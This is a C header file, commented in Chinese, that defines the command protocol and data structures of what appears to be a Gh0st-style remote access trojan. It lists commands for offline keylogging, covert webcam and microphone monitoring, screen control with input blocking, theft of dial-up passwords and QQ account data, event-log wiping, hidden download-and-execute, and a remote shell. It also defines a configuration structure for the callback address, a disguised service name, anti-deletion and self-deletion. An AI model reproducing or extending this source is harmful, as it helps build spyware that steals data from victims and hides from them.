#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////

//文件管理
enum
{
	// 文件传输方式
	    TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
		TRANSFER_MODE_ADDITION,			// 追加
		TRANSFER_MODE_ADDITION_ALL,		// 全部追加
		TRANSFER_MODE_OVERWRITE,		// 覆盖
		TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
		TRANSFER_MODE_JUMP,				// 覆盖
		TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
		TRANSFER_MODE_CANCEL			// 取消传送
};

enum
{
    	COMMAND_LIST_FILES = 1,			// 列出目录中的文件
		COMMAND_DOWN_FILES,				// 下载文件
		COMMAND_FILE_SIZE,				// 上传时的文件大小
		COMMAND_FILE_DATA,				// 上传时的文件数据
		COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
		COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
		COMMAND_STOP,					// 传输中止
		COMMAND_DELETE_FILE,			// 删除文件
		COMMAND_DELETE_DIRECTORY,		// 删除目录
		COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
		COMMAND_CREATE_FOLDER,			// 创建文件夹
		COMMAND_RENAME_FILE,			// 文件或文件改名
		COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
		COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
		
		TOKEN_FILE_LIST,				// 文件列表
		TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
		TOKEN_FILE_DATA,				// 文件数据
		TOKEN_TRANSFER_FINISH,			// 传输完毕
		TOKEN_DELETE_FINISH,			// 删除完毕
		TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
		TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
		TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
		TOKEN_DATA_CONTINUE,			// 继续传输数据
		TOKEN_RENAME_FINISH,			// 改名操作完成
		TOKEN_COMPRESS_FINISH,			// 压缩或解压完成
		TOKEN_EXCEPTION,				// 操作发生异常
};

//屏幕管理
enum
{
	COMMAND_AERO_DISABLE,			// 禁用桌面合成(Aero)
	COMMAND_AERO_ENABLE,			// 启用桌面合成(Aero)
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版


		
		
		TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
		TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
		TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容	
};

//键盘记录
enum
{
		COMMAND_KEYBOARD_OFFLINE = 1,	// 开启离线键盘记录
		COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容
		TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
};

//视频查看
enum
{
		COMMAND_WEBCAM_RESIZE = 1,    		// 摄像头调整分辩率，后面跟两个INT型的宽高
		TOKEN_WEBCAM_DIB,			    	// 摄像头的图像数据
};

//语音监听
enum
{
		COMMAND_AUDIO_DATE = 1,         // 发送本地语音数据
		COMMAND_AUDIO_CHANGER,          // 更改输入设备
		COMMAND_AUDIO_CHANGER_LINES,    // 更换输入声道
		
		TOKEN_AUDIO_DATA,               // 音频数据
		TOKEN_AUDIO_CHANGE_FINISH,      // 换道成功
};

//系统信息
enum
{
	TOKEN_CPUMEMORY
};
	

//系统管理
enum
{
		COMMAND_PSLIST = 1,				// 进程列表
		COMMAND_WSLIST,					// 窗口列表
		COMMAND_DSLIST,					// 拨号密码
		COMMAND_SOFTWARELIST,           // 软件列表
		COMMAND_HOSTS,					// HOSTS文件
		COMMAND_HARDWARE,				// 硬件信息 

		//////////////
		COMMAND_KILLPROCESS,			// 关闭进程
		COMMAND_KILLPROCESS_WINDOW,     // 关闭进程(窗口)
		COMMAND_FREEZING,				// 冻结进程
		COMMAND_THAW,					// 解冻进程
		COMMAND_FILEATTR,				// 文件属性
		COMMAND_WINDOW_TEST,            // 窗口隐藏、还原、最大化、最小化
		COMMAND_WINDOW_CLOSE,           // 窗口关闭
		COMMAND_APPUNINSTALL,			// 卸载程序
		//
		TOKEN_WSLIST,					// 窗口列表
		TOKEN_DIALUPASS,				// 拨号密码
		TOKEN_SOFTWARE,					// 软件信息
		TOKEN_HOSTS,					// HOSTS文
		TOKEN_HARDWARE,					// 硬件信息
		///////////////////////
		TOKEN_FILEATTR,					// 文件属性

};	

//服务管理
enum
{
		COMMAND_DELETESERVERICE = 100,       // 删除服务
		COMMAND_STARTSERVERICE,              // 启动服务
		COMMAND_STOPSERVERICE,               // 停止服务
		COMMAND_PAUSESERVERICE,              // 暂停服务
		COMMAND_CONTINUESERVERICE,           // 继续服务
};

//注册表管理	
enum
{
		COMMAND_REG_ENUM = 1,             // 枚举注册表
		COMMAND_REG_CREATEKEY,            // 创建路径
		COMMAND_REG_DELKEY,               // 删除路径
		COMMAND_REG_CREATKEY,             // 创建键
		COMMAND_REG_DELVAL,               // 删除键
		
		TOKEN_REG_INFO,                   // 注册表信息
		TOKEN_REG_SUCCEED,                // 注册表成功
		TOKEN_REG_ERROR,                  // 注册表出错
		TOKEN_REG_KEY,                    // 键值数据
};

//好友信息
enum
{
		COMMAND_QQDATA = 1,	
		TOKEN_QQDATA,					
};

//////////////////////////////////////////////////////////////////////////
enum
{
		COMMAND_PROXY_CONNECT= 1, //socket5代理
		COMMAND_PROXY_CLOSE,
		COMMAND_PROXY_DATA,
		
		TOKEN_PROXY_CONNECT_RESULT,
		TOKEN_PROXY_CLOSE,
		TOKEN_PROXY_DATA,
		TOKEN_PROXY_BIND_RESULT
};

enum
{
	// 控制端发出的命令
	COMMAND_NEXT = 100,				// 下一步(控制端已经打开对话框)
	COMMAND_SESSION = 0,			// 会话管理（关机，重启，注销, 卸载）
	COMMAND_UNINSTALL,              // 卸载
	COMMAND_DOWN_EXEC,              // 下载执行
	COMMAND_DOWN_UPDATE,            // 下载更新
	COMMAND_OPEN_URL_SHOW,          // 打开网页（显示）
	COMMAND_OPEN_URL_HIDE,          // 打开网页（隐藏）
	COMMAND_CLEAN_EVENT,            // 清理日志
	COMMAND_RENAME_REMARK,          // 更改备注
	COMMAND_CHANGE_GROUP,           // 更改分组
	COMMAND_SHOW_MSG,				// 消息弹窗

	COMMAND_OPEN_PROXY,             // 开启代理
	COMMAND_CLOSE_PROXY,            // 关闭代理
	COMMAND_START,					//写入启动


	// 控制端发出功能命令
	COMMAND_LIST_DRIVE,				//  文件管理
	COMMAND_SCREEN_SPY,				//  屏幕控制
	COMMAND_KEYBOARD,				//  键盘记录
	COMMAND_WEBCAM,					//  视频查看
	COMMAND_AUDIO,					//  语音监听
	COMMAND_SHELL,					//  远程终端
	COMMAND_SYSTEMINFO,				//  系统信息
	COMMAND_SYSTEM,					//  系统管理
	COMMAND_SERVICE,				//  服务管理
	COMMAND_REGEDIT,                //  注 册 表
	COMMAND_TEXT_CHAT,				//  远程聊天
	COMMAND_QQINFO,					//  好友信息
	COMMAND_PROXY_MAP,				//  代理映射

	


	
/////////////////////////////////////////////////////////////////////////////////////////

	// 服务端发出的标识
	TOKEN_LOGIN = 200,				// 上线包
	TOKEN_DRIVE_LIST,				// 文件管理
	TOKEN_BITMAPINFO,				// 屏幕控制
	TOKEN_KEYBOARD_START,			// 键盘记录
	TOKEN_WEBCAM_BITMAPINFO,		// 视频查看
	TOKEN_AUDIO_START,				// 语音监听
	TOKEN_SHELL_START,				// 远程终端
	TOKEN_SYSTEMINFO,				// 系统信息
	TOKEN_PSLIST,					// 系统管理
	TOKEN_SERVICE_LIST,             // 服务列表
	TOKEN_REGEDIT,					// 注册表
	TOKEN_TEXTCHAT_START,           // 远程聊天
	TOKEN_QQINFO,					// 好友信息
	TOKEN_PROXY_START,              // 代理映射
};

//清理日志
enum
{
		CLEAN_EVENT_ALL = 1,
		CLEAN_EVENT_SYS,
		CLEAN_EVENT_SEC,
		CLEAN_EVENT_APP
};

//////////上线结构体
typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[32];	// 上线分组
	IN_ADDR	    	IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUClockMhz;	// CPU频率
	int				nCPUNumber;		// CPU核数
	DWORD			MemSize;		// 内存大小
	DWORD           FreeMemSize;	// 可用内存
	DWORD			DriverSize;		// 硬盘容量
	DWORD			FreeDriverSize;	// 内存硬盘
	BOOL			bIsActive;	    // 用户状态
 	DWORD			dwSpeed;		// 网速
	char			nQQ[100];		//当前QQ
	DWORD			Speed;		    // 网卡
	bool			bIsWebCam;		// 是否有摄像头
	char            Virus[50];		// 杀毒软件
	char			szVersion[32];	// 上线版本
	char			BuildTime[50];	// 配置时间
}LOGININFO;

///////安装信息结构体
struct ONLINE_DATA
{
	char LoginAddr[100];    //上线地址
	DWORD LoginPort;		//上线端口
	char UpGroup[32];       //上线分组
	char Version[32];		//上线版本
	CHAR ServiceName[100];   //服务名称
	CHAR ServicePlay[128];   //服务显示
	CHAR ServiceDesc[256];   //服务描述
	CHAR FolderName[256];	 //目录名称
	CHAR ProcessName[128];   //进程名称
	CHAR Install;            //启动类型
	CHAR Mutex[100];		//运行互斥
	CHAR Buildtime[100];	//配置时间
	CHAR szDownRun[300];     //捆绑地址
	BOOL Antideletion;       //防删除
	BOOL Selfdeletion;		//自删除

};
#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度

#endif // !defined(AFX_MACROS_H_INCLUDED)